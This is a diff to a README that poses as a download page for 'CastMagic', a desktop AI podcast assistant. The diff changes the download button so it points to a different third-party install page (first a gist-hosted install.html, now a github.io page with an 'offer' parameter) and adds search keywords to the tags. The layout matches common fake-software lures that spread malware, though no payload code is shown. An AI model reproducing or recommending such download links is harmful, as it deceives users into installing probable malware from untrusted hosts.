@@ -1,6 +1,6 @@
 # CastMagic Download — Desktop AI Podcast Assistant  
 
-[![Get CastMagic GitHub](https://img.shields.io/badge/Get%20CastMagic%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/jojoramarhurst757/2918b2d0e4312fb99e2626be27733a57/raw/f884f8d46daa44d6906611f86d8d4dd7039d2586/install.html?offer=CastMagic)  
+[![Get CastMagic GitHub](https://img.shields.io/badge/Get%20CastMagic%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=CastMagic)  
 
 ---
 
@@ -63,7 +63,7 @@ A: Yes, you can manually edit AI-generated text directly in the desktop app.
 ---
 
 ## 🔍 Tags  
-CastMagic, AI podcast transcription, content automation, show notes generator, podcast editing, repurpose audio, Windows podcast app, Mac podcast tool, AI text generator, creator productivity, CastMagic pc, CastMagic windows, CastMagic desktop, CastMagic for mac, CastMagic for pc, CastMagic for windows, CastMagic mac  
+CastMagic, cast magic, casting spells, AI podcast transcription, content automation, show notes generator, podcast editing, repurpose audio, Windows podcast app, Mac podcast tool, AI text generator, creator productivity, CastMagic pc, CastMagic windows, CastMagic desktop, CastMagic for mac, CastMagic for pc, CastMagic for windows, CastMagic mac  
 
 ---
 
